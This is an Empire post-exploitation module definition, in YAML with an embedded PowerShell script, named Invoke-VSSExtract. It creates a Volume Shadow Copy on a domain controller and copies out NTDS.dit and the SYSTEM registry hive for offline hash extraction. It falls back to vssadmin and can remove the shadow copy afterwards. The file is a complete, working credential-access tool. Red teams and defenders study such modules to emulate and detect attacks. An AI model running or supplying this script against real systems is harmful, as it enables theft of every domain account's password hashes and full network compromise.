name: Invoke-VSSExtract
authors:
  - name: Anthony Rose
    handle: '@Cx01N'
    link: https://twitter.com/Cx01N_
description: |
  Creates a Volume Shadow Copy and extracts NTDS.dit with the SYSTEM registry hive from
  a domain controller for offline credential extraction workflows. This provides an
  alternative collection path to DCSync by obtaining files required for ntds/sam style
  parsing and hash recovery. The operation requires elevated privileges, typically Domain
  Admin or Backup Operator rights, and leaves host artifacts associated with VSS and file
  copy activity. It complements Empire credential access options such as Mimikatz DCSync
  and file-based collection techniques like NinjaCopy.
software: ''
tactics: [TA0006]
techniques: [T1003.003]
background: true
output_extension: ''
needs_admin: true
opsec_safe: false
language: powershell
min_language_version: '2'
comments:
  - https://docs.microsoft.com/en-us/windows/win32/vss/volume-shadow-copy-service-overview
options:
  - name: Agent
    description: Agent to run module on.
    required: true
    value: ''
  - name: Drive
    description: Drive letter to create shadow copy for.
    required: true
    value: 'C:'
  - name: OutputPath
    description: Local path to copy extracted files to.
    required: true
    value: 'C:\Windows\Temp'
  - name: CleanupShadow
    description: Delete the shadow copy after extraction.
    required: false
    value: 'True'
    strict: true
    suggested_values:
      - 'True'
      - 'False'
script: |
  function Invoke-VSSExtract {
      [CmdletBinding()]
      Param(
          [String]$Drive = 'C:',
          [String]$OutputPath = 'C:\Windows\Temp',
          [Switch]$CleanupShadow
      )

      $shadowId = $null
      $deviceObject = $null

      try {
          if ([String]::IsNullOrWhiteSpace($Drive)) {
              throw 'Drive cannot be empty.'
          }

          $Drive = $Drive.TrimEnd('\\')
          if ($Drive.Length -eq 1) {
              $Drive = $Drive + ':'
          }

          if (-not (Test-Path $OutputPath)) {
              Write-Output "[*] Creating output directory: $OutputPath"
              New-Item -Path $OutputPath -ItemType Directory -Force | Out-Null
          }

          Write-Output "[*] Creating VSS shadow copy for $Drive"

          try {
              $createResult = (Get-WmiObject -List Win32_ShadowCopy).Create($Drive + '\\', 'ClientAccessible')
              if ($createResult.ReturnValue -eq 0) {
                  $shadowId = $createResult.ShadowID
                  $shadowObj = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $shadowId }
                  if ($shadowObj) {
                      $deviceObject = $shadowObj.DeviceObject
                  }
                  Write-Output "[+] Shadow copy created via WMI: $shadowId"
              } else {
                  Write-Output "[!] WMI VSS creation failed with code: $($createResult.ReturnValue)"
              }
          } catch {
              Write-Output "[!] WMI VSS creation error: $($_.Exception.Message)"
          }

          if (-not $shadowId -or -not $deviceObject) {
              Write-Output '[*] Falling back to vssadmin shadow creation.'
              $vssCreateOutput = vssadmin create shadow /for=$Drive 2>&1 | Out-String

              if ($vssCreateOutput -match 'Shadow Copy ID:\s*(\{[^\}]+\})') {
                  $shadowId = $matches[1]
              }

              if ($vssCreateOutput -match 'Shadow Copy Volume Name:\s*(\\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\d+)') {
                  $deviceObject = $matches[1]
              }

              if ($shadowId) {
                  Write-Output "[+] Shadow copy created via vssadmin: $shadowId"
              }
          }

          if (-not $shadowId -or -not $deviceObject) {
              throw 'Failed to create a usable shadow copy. Check administrative privileges and VSS service status.'
          }

          $shadowRoot = $deviceObject.TrimEnd('\\')
          $ntdsSource = $shadowRoot + '\\Windows\\NTDS\\NTDS.dit'
          $systemSource = $shadowRoot + '\\Windows\\System32\\config\\SYSTEM'
          $ntdsDest = Join-Path $OutputPath 'NTDS.dit'
          $systemDest = Join-Path $OutputPath 'SYSTEM'

          if (-not (Test-Path $ntdsSource)) {
              throw 'NTDS.dit not found in shadow copy. Host is likely not a domain controller or path is inaccessible.'
          }

          Write-Output "[*] Copying NTDS.dit to $ntdsDest"
          cmd /c copy /y "$ntdsSource" "$ntdsDest" | Out-Null
          if (-not (Test-Path $ntdsDest)) {
              throw 'Failed to copy NTDS.dit from shadow copy.'
          }
          Write-Output '[+] NTDS.dit copied successfully.'

          if (-not (Test-Path $systemSource)) {
              throw 'SYSTEM hive not found in shadow copy.'
          }

          Write-Output "[*] Copying SYSTEM hive to $systemDest"
          cmd /c copy /y "$systemSource" "$systemDest" | Out-Null
          if (-not (Test-Path $systemDest)) {
              throw 'Failed to copy SYSTEM hive from shadow copy.'
          }
          Write-Output '[+] SYSTEM hive copied successfully.'
          Write-Output "[+] Extraction complete. Files saved to $OutputPath"
      }
      catch {
          Write-Output "[!] Invoke-VSSExtract error: $($_.Exception.Message)"
      }
      finally {
          if ($CleanupShadow.IsPresent -and $shadowId) {
              Write-Output "[*] Cleaning up shadow copy: $shadowId"
              vssadmin delete shadows /shadow=$shadowId /quiet | Out-Null
          }
      }
  }
script_end: Invoke-VSSExtract {{ PARAMS }}
